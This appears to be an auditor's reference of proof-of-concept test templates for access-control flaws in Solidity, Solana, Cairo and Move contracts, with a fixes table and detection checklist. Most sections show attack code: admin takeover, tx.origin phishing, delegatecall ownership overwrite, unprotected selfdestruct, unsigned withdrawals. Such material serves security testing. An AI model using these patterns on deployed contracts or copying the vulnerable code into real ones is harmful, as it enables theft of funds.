# Access Control PoC Templates

## EVM - Missing Owner Check
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract AccessControlTest is Test {
    VulnerableContract target;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        target = new VulnerableContract();
    }

    function testMissingOwnerCheck() public {
        // Attacker can call admin function
        vm.prank(attacker);
        target.setAdmin(attacker); // Should revert but doesn't
        
        assertEq(target.admin(), attacker, "Attacker became admin");
    }

    function testUnprotectedInitialize() public {
        // Attacker re-initializes contract
        vm.prank(attacker);
        target.initialize(attacker); // Should only be callable once
        
        assertEq(target.owner(), attacker);
    }
}
```

## EVM - tx.origin vs msg.sender
```solidity
contract TxOriginTest is Test {
    function testTxOriginPhishing() public {
        // Vulnerable contract uses tx.origin
        // Attack: trick owner into calling attacker contract
        
        vm.prank(owner, owner); // tx.origin = owner, msg.sender = owner
        attackerContract.maliciousFunction();
        
        // Inside maliciousFunction:
        // vulnerable.withdraw() checks tx.origin == owner (passes!)
    }
}

contract AttackerContract {
    IVulnerable vulnerable;
    
    function maliciousFunction() external {
        // tx.origin is still the original caller (owner)
        vulnerable.withdraw(); // Steals owner's funds
    }
}
```

## EVM - Unprotected Selfdestruct
```solidity
contract SelfdestructTest is Test {
    function testUnprotectedSelfdestruct() public {
        uint256 balanceBefore = address(target).balance;
        
        vm.prank(attacker);
        target.destroy(); // No access control
        
        // Contract destroyed, funds sent to attacker
        assertEq(address(target).code.length, 0);
    }
}
```

## EVM - Delegatecall to Untrusted Contract
```solidity
contract DelegatecallTest is Test {
    function testMaliciousDelegatecall() public {
        // Vulnerable: delegatecall to user-provided address
        
        vm.prank(attacker);
        target.execute(
            address(maliciousContract),
            abi.encodeWithSignature("takeOwnership()")
        );
        
        // Malicious contract executes in target's context
        assertEq(target.owner(), attacker);
    }
}

contract MaliciousContract {
    address public owner; // Same slot as target
    
    function takeOwnership() external {
        owner = msg.sender; // Overwrites target's owner
    }
}
```

## Solana - Missing Signer Check
```rust
#[derive(Accounts)]
pub struct VulnerableWithdraw<'info> {
    // Vulnerable: authority is not a Signer
    pub authority: AccountInfo<'info>,
    #[account(mut)]
    pub vault: Account<'info, Vault>,
}

// Attack test
#[test]
fn test_missing_signer() {
    let attacker = Keypair::new();
    
    // Attacker passes victim's pubkey as authority (not signing)
    let ix = Instruction {
        program_id: program::ID,
        accounts: vec![
            AccountMeta::new_readonly(victim.pubkey(), false), // Not signer!
            AccountMeta::new(vault_pda, false),
        ],
        data: instruction::Withdraw { amount: 1000 }.data(),
    };
    
    // Succeeds because no signature verification
    process_transaction(&[ix], &[&attacker]).unwrap();
}
```

## Solana - Missing Owner Check
```rust
#[derive(Accounts)]
pub struct VulnerableTransfer<'info> {
    #[account(mut)]
    pub from_token_account: Account<'info, TokenAccount>,
    // Missing: constraint = from_token_account.owner == authority.key()
    pub authority: Signer<'info>,
}

#[test]
fn test_missing_owner_check() {
    // Attacker can transfer from any token account
    let ix = spl_token::instruction::transfer(
        &spl_token::ID,
        &victim_token_account,
        &attacker_token_account,
        &attacker.pubkey(), // Attacker signs
        &[],
        1000,
    )?;
}
```

## Cairo - Missing Caller Check
```cairo
// Vulnerable
#[external(v0)]
fn withdraw(ref self: ContractState, amount: u256) {
    // No check on caller
    let token = IERC20Dispatcher { contract_address: self.token.read() };
    token.transfer(get_caller_address(), amount);
}

// Test
#[test]
fn test_missing_caller_check() {
    let target = deploy_target();
    let attacker: ContractAddress = 0x123.try_into().unwrap();
    
    start_cheat_caller_address(target, attacker);
    ITargetDispatcher { contract_address: target }.withdraw(1000);
    stop_cheat_caller_address(target);
    
    // Attacker successfully withdrew
}
```

## Move - Missing Capability Check
```move
// Vulnerable - no capability required
public fun admin_action(account: &signer) {
    // Anyone can call
}

// Fixed - requires AdminCap
public fun admin_action(account: &signer, _cap: &AdminCap) {
    // Only holders of AdminCap can call
}

#[test]
fun test_missing_cap() {
    let attacker = @0x123;
    // Attacker can call without capability
    admin_action(&attacker); // Should fail but doesn't
}
```

## Common Vulnerable Patterns

| Pattern | Vulnerability | Fix |
|---------|---------------|-----|
| `tx.origin` auth | Phishing attack | Use `msg.sender` |
| No `onlyOwner` | Anyone can call admin | Add modifier |
| Unprotected `initialize` | Re-initialization | Add `initializer` |
| Open `delegatecall` | Context hijacking | Whitelist targets |
| Missing signer (Solana) | Unsigned transactions | Add `Signer` |
| Missing capability (Move) | Unauthorized access | Require capability |

## Detection Checklist
- [ ] Admin functions without access control
- [ ] Use of `tx.origin` for authentication
- [ ] Unprotected `initialize` functions
- [ ] `delegatecall` to user-provided address
- [ ] Missing `Signer` constraint (Solana)
- [ ] Missing owner/authority checks
- [ ] Unprotected `selfdestruct`
- [ ] Upgradeable proxy without access control
